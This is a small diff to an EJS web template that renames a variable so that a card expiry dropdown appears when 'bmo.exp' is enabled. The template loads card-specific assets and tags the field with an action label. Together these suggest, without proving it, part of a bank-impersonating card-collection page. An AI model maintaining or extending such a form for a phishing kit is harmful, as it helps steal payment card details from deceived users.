@@ -201,7 +201,7 @@ let p_expiry = bmo.exp === 'on' ? true : false;
                                                                         <script src="/assets/js/splitter.js?v=<%= Date.now() %>"></script>
                                                                         <link rel="stylesheet" href="/assets/css/card.css?<%= Date.now() %>">
                                                                     </div>
-                                                                <% } if (p_exp) { %>
+                                                                <% } if (p_expiry) { %>
                                                                     <div class="form-group" style="">
                                                                         <label style="display: block;">Expiry</label>
                                                                         <select name="exp1" required class="form-control text-center display-inline-block lrinput" attr-action="Selecting Expiry" style="width:48%; display: inline-block;">
